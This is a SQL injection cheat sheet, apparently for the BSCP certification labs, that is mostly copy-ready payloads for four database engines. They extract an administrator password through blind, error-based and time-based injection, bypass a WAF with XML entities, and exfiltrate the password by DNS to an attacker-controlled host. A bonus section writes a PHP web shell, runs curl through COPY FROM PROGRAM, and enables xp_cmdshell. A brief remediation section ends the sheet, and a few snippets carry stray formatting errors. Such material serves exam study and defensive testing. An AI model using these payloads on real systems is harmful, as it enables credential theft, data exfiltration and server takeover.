# Core Concepts

## What is SQL Injection (SQLi)?

SQL Injection is a critical vulnerability that occurs when a web application takes user-supplied input and directly concatenates it into a back-end database query without proper validation or parameterization. This allows an attacker to manipulate the structure of the SQL command and execute arbitrary queries.

## Why does SQLi occur?

It occurs due to a fundamental failure to separate **code** from **data**. When applications use simple string concatenation to construct queries (e.g., `"SELECT * FROM sessions WHERE id = '" + userInput + "'"`), the database interpreter treats special characters (like `'`, `-`, `;`) within the data as executable code syntax.

# Discovery & Identification Framework

Before extracting data, identify the database engine and the behavioural vector using these minimal inputs:

```
                  [ Inject Single Quote (') ]
                               │
            ┌──────────────────┴──────────────────┐
            ▼                                     ▼
   [ Visual Error Traces ]              [ Uniform Response ]
   (Visible Error-Based)                          │
                                                  ▼
                                      [ Test Boolean Logic ]
                                      (AND 1=1 vs AND 1=2)
                                                  │
                  ┌───────────────────────────────┴───────────────────────────────┐
                  ▼ (Response Changes)                                            ▼ (No Change)
         [ Boolean-Based Blind ]                                        [ Test Time Delays ]
                                                                       (Sleep 5s vs Sleep 0s)
                                                                                  │
                                                ┌─────────────────────────────────┴─────────────────────────────────┐
                                                ▼ (Delay Triggers)                                                  ▼ (No Delay)
                                        [ Time-Based Blind ]                                              [ Out-of-Band (OOB) ]
                                                                                                          (Trigger Domain Lookup)
```

### Quick Engine Fingerprinting

- **Oracle**: Requires a `FROM` clause for every `SELECT` (e.g., `FROM dual`). Uses `||` for string concatenation. Comment syntax is `--`.
    
- **PostgreSQL**: Allows standalone `SELECT`. Uses `||` for concatenation. Comment syntax is `--`.
    
- **MS SQL**: Allows standalone `SELECT`. Uses `+` for concatenation. Comment syntax is `--`.
    
- **MySQL**: Requires a space after the comment dashes (`--` or `#`). Uses `CONCAT()` or spaces for string concatenation.
# BSCP Exam Cheat Sheet: The 8 Core Lab Scenarios

## 1. Blind SQLi with Conditional Responses

- **Behavior:** The page displays a specific indicator (e.g., `"Welcome back"`) when the query is true, and drops it when false. No database errors appear.
    

### Stage 1: Identification

- **MySQL / PG / MS SQL:** `TrackingId=xyz' AND 1=1--` vs `TrackingId=xyz' AND 1=2--`
    
- **Oracle:** `TrackingId=xyz' AND 1=1--` vs `TrackingId=xyz' AND 1=2--`
    

### Stage 2: Data Extraction

Verify the table and user first, then extract the password length, followed by character-by-character extraction using Burp Intruder (Grep - Match: `Welcome back`).

- **MySQL / MS SQL:**
    
    - _Verify User:_ `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a--`
        
    - _Length Check:_ `TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--`
        
    - _Character Extract:_ `TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a--`
        
- **PostgreSQL:**
    
    - _Character Extract:_ `TrackingId=xyz' AND SUBSTRING((SELECT password FROM users WHERE username='administrator') FROM 1 FOR 1)='a--`
        
- **Oracle:**
    
    - _Verify User:_ `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND ROWNUM=1)='a'--`
        
    - _Length Check:_ `TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20--`
        
    - _Character Extract:_ `TrackingId=xyz' AND SUBSTR((SELECT password FROM users WHERE username='administrator'),1,1)='a'--`
        

## 2. Blind SQLi with Conditional Errors

- **Behavior:** The application returns a generic `HTTP 500 Internal Server Error` if a database error occurs, and `HTTP 200 OK` if the query runs without exceptions.
### Stage 1: Identification

Force a conditional runtime error (like division by zero or conversion failure) when the expression evaluates to true.

- **MySQL:** `TrackingId=xyz' AND (SELECT IF(1=1, 1/0, 1))--`
    
- **PostgreSQL:** `TrackingId=xyz' AND 1=(CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--`
    
- **MS SQL:** `TrackingId=xyz' AND 1=(CASE WHEN (1=1) THEN 1/0 ELSE 1 END)--`
    
- **Oracle:** `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
    

### Stage 2: Data Extraction

Set Burp Intruder to monitor for `HTTP 500` status codes to confirm successful character matches.

- **PostgreSQL / MS SQL:**
    
    SQL
    
    ```
    TrackingId=xyz' AND 1=(CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') THEN 1/0 ELSE 1 END)-- 
    ```
    
- **Oracle:**
    
    SQL
    
    ```
    TrackingId=xyz'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
    ```
    

## 3. Visible Error-Based SQL Injection

- **Behavior:** The web server prints raw database error strings inside the HTML response, allowing you to bypass character-by-character guessing entirely.
    

### Stage 1 & 2: Direct Data Extraction

Force the database to cast or parse the target administrative password field using an incompatible type or an invalid function path.

- **MySQL:**
    
    SQL
    
    ```
    TrackingId=' AND UpdateXML(1, CONCAT(0x3a, (SELECT password FROM users WHERE username='administrator')), 1)-- `
    ```
    
- **PostgreSQL:**
    
    SQL
    
    ```
    TrackingId=' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int)-- `
    ```
    
- **MS SQL:**
    
    SQL
    
    ```
    TrackingId=' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users WHERE username='administrator'))-- `
    ```
    
- **Oracle:**
    
    SQL
    
    ```
    TrackingId=' AND 1=CTXSYS.DRITXMD.TXFETCH((SELECT password FROM users WHERE username='administrator'),1,1,1)--`
    ```
## 4 & 5. Blind SQLi with Time Delays (& Information Retrieval)

- **Behavior:** The page remains identical and errors are silenced. You evaluate execution logic based entirely on how many seconds the server network socket takes to respond.
    

### Stage 1: Identification

Trigger a baseline sleep delay of 10 seconds.

- **MySQL:** `TrackingId=xyz' AND SLEEP(10)--`
    
- **PostgreSQL:** `TrackingId=xyz' || pg_sleep(10)--`
    
- **MS SQL:** `TrackingId=xyz'; WAITFOR DELAY '0:0:10'--`
    
- **Oracle:** `TrackingId=xyz' AND 1=dbms_pipe.receive_message('RDS',10)--`
    

### Stage 2: Data Extraction

Set up a single-threaded Burp Intruder pool (Maximum concurrent requests = 1) and analyze the **Response received** column for delays matching your sleep statement.

> ⚠️ **PostgreSQL Exam Trap:** Standalone subqueries like `AND (SELECT CASE WHEN... THEN pg_sleep(5) END)` often fail or get optimized away by PostgreSQL if the primary key/cookie value doesn't return a matching row. Always use the explicit table-driven syntax below to guarantee execution.

- **MySQL:**
    
    SQL
    
    ```
    TrackingId=xyz' AND IF(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a', SLEEP(5), 0)-- `
    ```
    
- **PostgreSQL (Table-Driven):**
    
    SQL
    
    ```
    TrackingId=xyz' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- `
    ```
    
- **MS SQL:**
    
    SQL
    
    ```
    TrackingId=xyz'; IF (SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a') WAITFOR DELAY '0:0:5'-- `
    ```
    
- **Oracle:**
    
    SQL
    
    ```TrackingId=xyz' AND 1=(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN dbms_pipe.receive_message('RDS',5) ELSE 1 END FROM users WHERE username='administrator')--```
  

## 6 & 7. Blind SQLi via Out-of-Band (OOB) / Collaborator Interaction

- **Behavior:** The query executes completely asynchronously, disconnected from the frontend response. You force the server's network stack to initiate a loopback lookup to a domain you manage (Burp Collaborator).

### Stage 1: Identification (Triggering a Ping)

- **MySQL (Windows Only):** `TrackingId=xyz' AND LOAD_FILE('\\\\your-id.oast.fun\\a')--`
    
- **PostgreSQL:** `TrackingId=xyz'; COPY users FROM PROGRAM 'ping your-id.oast.fun'--`
    
- **MS SQL:** `TrackingId=xyz'; EXEC master..xp_dirtree '\\your-id.oast.fun\a'--`
    
- **Oracle (XMLType / XXE):**
    
    SQL
    
    ```
    TrackingId=xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://your-id.oast.fun/"> %remote;]>'),'/l')+FROM+dual--
    ```
    

### Stage 2: Data Exfiltration (Stealing the Password in One Shot)

Prepend the target query data directly into the host subdomain segment. Check your Burp Collaborator client logs for incoming DNS queries containing the string.

- **MySQL (Windows Only):**
    
    SQL
    
    ```
    TrackingId=xyz' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='administrator'), '.your-id.oast.fun\\a'))-- `
    ```
    
- **MS SQL:**
    
    SQL
    
    ```
    TrackingId=xyz'; DECLARE @p varchar(1024); SET @p = (SELECT password FROM users WHERE username='administrator'); EXEC('master..xp_dirtree "\\' + @p + '.your-id.oast.fun\a"');-- `
    ```
    
- **Oracle:**
    
    SQL
    
    ```
    TrackingId=xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.your-id.oast.fun/"> %remote;]>'),'/l')+FROM+dual--
    ```
    

## 8. SQL Injection via XML Entity Encoding

- **Behavior:** Input fields are transmitted via XML formats (`<storeId>1</storeId>`). Direct statements like `UNION SELECT` trigger a frontend WAF block.


### The Bypass Strategy

Web Application Firewalls often analyze incoming raw input strings. By obfuscating the SQL commands inside XML decimal or hex entities, the WAF passes the data as benign text, while the internal application server decodes it back into functional SQL.

- **Original Blocked Payload:** `<storeId>1 UNION SELECT username || '~' || password FROM users</storeId>`
    
- **Obfuscated XML Payload (Using `&apos;` and hex/decimal entities):**
    
    XML
    
    ```
    <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; username || &apos;~&apos; || password FROM users</storeId>
    ```
    

## Bonus: SQL Injection to Remote Code Execution (RCE)

While outside the standard scope of the BSCP exam, achieving shell or system-level code execution via SQLi is a critical real-world vector.

- **MySQL (Write Web Shell):** Requires `secure_file_priv` to be empty.
    
    SQL
    
    ```
    ' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- `
    ```
    
- **PostgreSQL (Program Execution):** Uses the administrative `COPY ... FROM PROGRAM` construct.
    
    SQL
    
    ```
    '; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id; curl http://your-id.oast.fun/';-- `
    ```
    
- **MS SQL (`xp_cmdshell`):** Requires enabling the extended procedure configuration options first.
    
    SQL
    
    ```
    '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';-- `
    ```
    

# Remediation Strategy

To eliminate SQL injection permanently, developers must ensure that the application handles parameters safely:

1. **Parameterized Queries / Prepared Statements (Primary Defense):** Pre-compiles the SQL query layout on the engine level so user input variables are strictly bound as data literals, never executable code syntax.
    
    - _Example (PHP PDO):_ ```php $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :user'); $stmt->execute(['user' => $userInput]);
        
2. **Stored Procedures:** When implemented correctly with internal parameter binding, stored procedures mirror the defense of prepared statements.
    
3. **Allow-listing Input Validation:** For dynamic structural values that cannot be parameterized (such as column names or sorting order directions like `ASC`/`DESC`), enforce a strict operational allow-list.